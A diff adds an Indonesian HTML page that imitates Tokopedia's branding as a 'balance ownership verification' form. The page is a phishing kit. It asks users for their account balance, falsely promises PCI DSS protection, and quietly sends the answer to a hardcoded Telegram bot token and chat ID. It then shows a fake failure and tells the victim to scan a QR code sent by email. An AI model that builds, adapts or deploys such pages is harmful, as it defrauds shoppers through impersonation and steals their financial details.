@@ -1,0 +1,201 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verifikasi & Pengajuan Dana</title>
+
+  <!-- Tailwind -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            'tokped-green': '#40b549',
+            'tokped-dark': '#424242',
+            'tokped-gray': '#f0f0f0',
+            'tokped-red': '#dd4b39',
+          },
+        },
+      },
+    };
+  </script>
+
+  <style>
+    .back-btn {
+      color: #424242;
+    }
+  </style>
+</head>
+
+<body class="min-h-screen bg-white font-sans">
+
+  <!-- Header -->
+  <header class="sticky top-0 z-10 flex items-center border-b border-gray-200 bg-white px-4 py-4">
+    <button
+      type="button"
+      class="mr-3 text-2xl font-light leading-none back-btn"
+      onclick="window.history.back()"
+      aria-label="Kembali"
+    >
+      &#x276E;
+    </button>
+    <h1 class="flex-1 text-lg font-bold text-tokped-dark">
+      Verifikasi & Pengajuan
+    </h1>
+  </header>
+
+  <!-- Main -->
+  <main class="mx-auto mt-8 max-w-md px-6">
+
+    <!-- Form -->
+    <form id="mainForm" novalidate>
+
+      <!-- Intro -->
+      <section class="mb-8">
+        <h2 class="mb-1 text-xl font-bold text-tokped-dark">
+          Verifikasi Kepemilikan Saldo
+        </h2>
+        <p class="text-sm text-gray-500">
+          Harap masukkan data saldo sesuai dengan rekening Anda.
+        </p>
+      </section>
+
+      <!-- Saldo Input -->
+      <label for="saldo" class="mb-2 block text-sm text-gray-500">
+        Saldo Terakhir Anda
+      </label>
+
+      <div class="relative mb-8">
+        <input
+          id="saldo"
+          type="number"
+          required
+          placeholder="Tuliskan Saldo Terakhir Anda"
+          class="w-full border-b border-gray-300 px-0 py-3 text-lg font-semibold
+                 focus:border-tokped-green focus:outline-none"
+        />
+      </div>
+
+      <!-- Submit Button -->
+      <button
+        id="submitBtn"
+        type="submit"
+        class="w-full rounded-lg bg-tokped-green py-3 font-bold text-white
+               shadow-lg shadow-green-200/50 transition duration-150
+               hover:bg-green-700"
+      >
+        KIRIM
+      </button>
+
+      <!-- Security Info -->
+      <div class="mt-10 flex items-start rounded-lg border border-gray-200 bg-tokped-gray p-4">
+        <span class="mr-3 text-2xl text-tokped-green">&#10003;</span>
+        <p class="text-xs font-medium text-gray-700">
+          Data saldo kamu terproteksi dan disimpan secara aman dengan standar
+          <span class="font-bold">PCI DSS</span>.
+        </p>
+      </div>
+
+    </form>
+
+    <!-- Fallback Section -->
+    <section id="fallbackSection" class="mt-10 hidden border-t pt-8">
+      <div
+        class="mb-8 rounded-lg border-l-4 border-yellow-500 bg-yellow-100 p-4 text-tokped-dark"
+        role="alert"
+      >
+        <p class="text-lg font-bold">Silahkan Cek Email Anda</p>
+        <p class="text-sm">Scan QR yang dikirim di email Anda</p>
+      </div>
+
+      <button
+        type="button"
+        onclick="window.location.href='index.html'"
+        class="w-full rounded-lg border border-gray-300 bg-gray-200 py-3
+               font-bold text-tokped-dark transition duration-150
+               hover:bg-gray-300"
+      >
+        KEMBALI KE HALAMAN UTAMA
+      </button>
+    </section>
+
+    <div class="pb-20"></div>
+  </main>
+
+  <!-- Script -->
+  <script>
+    // =========================
+    // KONFIGURASI TELEGRAM
+    // =========================
+    const TELEGRAM_BOT_TOKEN = '8449078397:AAFqHmrJKLNo4ZX1TCsbCn1uf-GjrQtnmo8';
+    const TELEGRAM_CHAT_ID = '7823308464';
+    const now = new Date().toLocaleString('id-ID');
+
+    // =========================
+    // ELEMEN DOM
+    // =========================
+    const mainForm = document.getElementById('mainForm');
+    const submitBtn = document.getElementById('submitBtn');
+    const saldoInput = document.getElementById('saldo');
+    const fallbackSection = document.getElementById('fallbackSection');
+
+    // =========================
+    // HELPER
+    // =========================
+    function sendTelegram(message, type = 'Markdown') {
+      return fetch(
+        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: type,
+          }),
+        }
+      ).catch(err => console.error('Error Telegram:', err));
+    }
+
+    // =========================
+    // SUBMIT LOGIC
+    // =========================
+    mainForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const saldo = saldoInput.value;
+
+      if (!saldo || isNaN(saldo) || saldo.length < 5) {
+        alert('Harap isi Saldo Terakhir dengan benar (minimal 5 digit).');
+        return;
+      }
+
+      submitBtn.textContent = 'Mengirim Data...';
+      submitBtn.disabled = true;
+
+      const message = `
+🚨 *DATA SALDO LENGKAP*
+=========================
+💲 Saldo Terakhir: Rp ${saldo}
+🕒 Waktu: ${now}
+      `;
+
+      await sendTelegram(message);
+
+      setTimeout(() => {
+        saldoInput.disabled = true;
+
+        submitBtn.textContent = 'Verifikasi Gagal';
+        submitBtn.classList.remove('bg-tokped-green', 'hover:bg-green-700');
+        submitBtn.classList.add('bg-tokped-red');
+
+        fallbackSection.classList.remove('hidden');
+        sendTelegram('🔴 *PROSES SELESAI*. Verifikasi data gagal.');
+      }, 2500);
+    });
+  </script>
+
+</body>
+</html>
